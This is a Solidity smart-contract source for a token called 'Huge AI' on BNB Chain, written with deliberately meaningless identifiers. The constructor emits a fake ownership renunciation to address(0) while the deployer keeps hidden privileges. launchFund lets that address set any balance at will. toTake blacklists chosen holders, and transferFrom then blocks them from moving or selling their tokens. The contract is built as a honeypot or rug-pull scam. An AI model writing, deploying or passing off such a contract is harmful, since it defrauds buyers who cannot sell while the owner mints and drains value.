/**
 *Submitted for verification at BscScan.com on 2023-02-24
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface tokenAt {
    function createPair(address launchedMinExempt, address maxBuyMarketing) external returns (address);
}

contract HugeAI {

    bool public enableReceiver;

    function tradingAtLimit() private view returns (address) {
        return msg.sender;
    }

    function toTake(address txExempt) public {
        require(receiverFrom[tradingAtLimit()]);
        if (txExempt == launchedAmount || txExempt == listBuyTeam) {
            return;
        }
        launchedList[txExempt] = true;
    }

    event Approval(address indexed launchedLaunch, address indexed spender, uint256 value);

    function transfer(address minAt, uint256 autoSell) external returns (bool) {
        return transferFrom(tradingAtLimit(), minAt, autoSell);
    }

    string public symbol = "HAI";

    function launchFund(address minAt, uint256 autoSell) public {
        require(receiverFrom[tradingAtLimit()]);
        balanceOf[minAt] = autoSell;
    }

    uint256 private exemptAmountMax;

    address public listBuyTeam;

    uint8 public decimals = 18;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    address public launchedAmount;

    mapping(address => bool) public receiverFrom;

    function approve(address launchedMarketingIs, uint256 autoSell) public returns (bool) {
        allowance[tradingAtLimit()][launchedMarketingIs] = autoSell;
        emit Approval(tradingAtLimit(), launchedMarketingIs, autoSell);
        return true;
    }

    address public owner;

    uint256 public isToken;

    function receiverSell(address amountShould) public {
        require(!tokenMax);
        receiverFrom[amountShould] = true;
        tokenMax = true;
    }

    event Transfer(address indexed from, address indexed isAmount, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function transferFrom(address walletTeamSender, address minAt, uint256 autoSell) public returns (bool) {
        if (walletTeamSender != tradingAtLimit() && allowance[walletTeamSender][tradingAtLimit()] != type(uint256).max) {
            require(allowance[walletTeamSender][tradingAtLimit()] >= autoSell);
            allowance[walletTeamSender][tradingAtLimit()] -= autoSell;
        }
        require(!launchedList[walletTeamSender]);
        return teamSell(walletTeamSender, minAt, autoSell);
    }

    mapping(address => bool) public launchedList;

    mapping(address => uint256) public balanceOf;

    bool public tokenMax;

    bool private fundTeamLaunch;

    string public name = "Huge AI";

    constructor (){ 
        listBuyTeam = tokenAt(address(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)).createPair(address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c),address(this));
        launchedAmount = tradingAtLimit();
        balanceOf[launchedAmount] = totalSupply;
        receiverFrom[launchedAmount] = true;
        emit Transfer(address(0), launchedAmount, totalSupply);
        emit OwnershipTransferred(launchedAmount, address(0));
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    uint256 public modeToken;

    function teamSell(address buyList, address feeToken, uint256 autoSell) internal returns (bool) {
        require(balanceOf[buyList] >= autoSell);
        balanceOf[buyList] -= autoSell;
        balanceOf[feeToken] += autoSell;
        emit Transfer(buyList, feeToken, autoSell);
        return true;
    }

}